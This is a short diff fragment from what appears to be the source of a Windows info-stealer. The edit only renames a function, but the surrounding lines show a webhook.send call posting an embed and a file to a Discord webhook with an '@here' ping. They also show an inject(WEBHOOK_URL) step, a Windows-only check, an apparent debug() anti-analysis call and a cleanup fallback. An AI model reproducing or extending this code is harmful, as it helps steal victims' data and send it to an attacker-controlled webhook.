@@ -65,7 +65,7 @@ def main(webhook_url):
 	
 	webhook.send(content="||@here||", embed=embed, file=file, avatar_url="https://cdn.discordapp.com/attachments/1041182399096180869/1090814098440200324/jesus.jpg", username="Cortés Family")
 	
-def CortésFamily():
+def CortesFamily():
 	for func in {
 		main(WEBHOOK_URL), 
 		inject(WEBHOOK_URL),
@@ -537,7 +537,7 @@ if __name__ == '__main__':
 	if os.name != "nt":
 		exit()
 	
-	try: debug(); CortésFamily()
+	try: debug(); CortesFamily()
 	except:
 		try: cleanup()
 		except: exit()
